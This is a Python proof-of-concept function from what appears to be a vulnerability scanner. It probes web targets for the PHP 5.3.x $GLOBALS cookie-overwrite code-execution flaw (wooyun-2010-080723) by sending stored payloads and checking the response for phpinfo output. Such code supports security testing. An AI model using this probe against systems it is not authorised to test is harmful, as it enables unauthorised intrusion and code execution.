#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def wooyun_2010_080723_scan(self, url):                 # todo 7: POC的名称(例如 cnvd_2018_24942_scan)
    ''' 
        由于php5.3.x版本里php.ini的设置里request_order默认值为GP,
        导致$_REQUEST中不再包含$_COOKIE, 
        我们通过在Cookie中传入$GLOBALS来覆盖全局变量, 可以造成代码执行漏洞。
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'                        # todo 8: 漏洞类型(例如 RCE)
    vul_info['vul_id'] = 'wooyun-2010-080723'           # todo 9: 漏洞编号(例如 CNVD-2018-24942)
    vul_info['vul_method'] = 'GET'                      # todo 10: 请求方式(例如 GET)

    for payload in self.wooyun_2010_080723_payloads:    # todo 3: 同上, Payload的名称
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.get(                         # todo 11: 请求方式(例如 get)
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )

            logger.logging(vul_info, res.status_code, res)                    # * LOG


            # todo 判断
            if (('PHP Version' in res.text) and ('PHP License' in res.text)):           # todo 12: 判断扫描结果
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
